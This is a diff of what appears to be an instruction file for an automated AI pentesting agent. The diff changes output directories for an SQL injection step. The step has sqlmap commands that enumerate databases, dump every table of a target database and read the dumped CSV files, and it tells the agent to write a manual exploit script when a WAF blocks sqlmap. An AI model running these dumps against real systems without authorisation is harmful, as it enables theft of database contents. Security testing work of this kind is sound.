@@ -38,11 +38,11 @@ You will receive from web-recon context:
 2. **Automate** — check dedup first, then run sqlmap:
 ```
    # Check if already done
-   ls /tmp/sqlmap_out/<host>/dump/ 2>/dev/null && echo "ALREADY DONE" || \
+   ls /tmp/aurelinth/aurelinth/sqlmap_out/<host>/dump/ 2>/dev/null && echo "ALREADY DONE" || \
    python3 /home/foqs/tools/sqlmap/sqlmap.py -u "URL" -p param \
      --dbs --batch --level=1 --risk=1 \
      --technique=BEUSTQ --threads=5 --time-sec=1 \
-     --output-dir=/tmp/sqlmap_out 2>&1 \
+     --output-dir=/tmp/aurelinth/aurelinth/sqlmap_out 2>&1 \
      | grep -E "\[\*\]|\[INFO\].*(found|fetched|retrieved|dumping)|Database:|Table:"
 ```
    Then dump promising tables:
@@ -52,16 +52,16 @@ You will receive from web-recon context:
   python3 /home/foqs/tools/sqlmap/sqlmap.py -u "URL" -p param \
     -D acuart --dump-all --batch \
     --technique=BEUSTQ --threads=5 --time-sec=1 \
-    --output-dir=/tmp/sqlmap_out 2>&1 \
+    --output-dir=/tmp/aurelinth/aurelinth/sqlmap_out 2>&1 \
     | grep -E "\[\*\]|\[INFO\].*(found|fetched|dumping)|Table:|Database:"
 ```
    Read results from dump files:
 ```
-   find /tmp/sqlmap_out -name "*.csv" | xargs cat
+   find /tmp/aurelinth/aurelinth/sqlmap_out -name "*.csv" | xargs cat
 ```
 
 3. **Manual script** — only if sqlmap is blocked or WAF detected:
-   Write to `~/.gemini/tmp/aurelinth/sqli_exploit.py`, use requests library,
+   Write to `~/.gemini/tmp/aurelinth/aurelinth/sqli_exploit.py`, use requests library,
    print structured findings only — no raw HTML.
 
 ## Output Format
